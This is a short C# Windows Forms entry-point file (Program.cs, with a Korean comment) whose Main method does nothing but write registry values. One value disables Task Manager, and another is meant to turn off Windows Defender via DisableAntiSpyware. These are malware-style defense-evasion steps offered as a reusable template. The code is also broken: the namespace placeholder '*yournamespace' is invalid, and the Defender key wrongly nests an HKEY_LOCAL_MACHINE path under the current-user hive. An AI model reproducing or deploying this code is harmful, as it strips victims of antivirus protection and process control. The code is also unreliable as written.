using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace *yournamespace
{
    static class Program
    {
        /// <summary>
        /// 해당 애플리케이션의 주 진입점입니다.
        /// </summary>
        [STAThread]
        static void Main()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            objRegistryKey.SetValue("DisableTaskMgr", 1);
            objRegistryKey.Close();


            RegistryKey objRegistryKey2 = Registry.CurrentUser.CreateSubKey("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender");
            objRegistryKey2.SetValue("DisableAntiSpyware", 1);
            objRegistryKey2.Close();
        }
    }
}
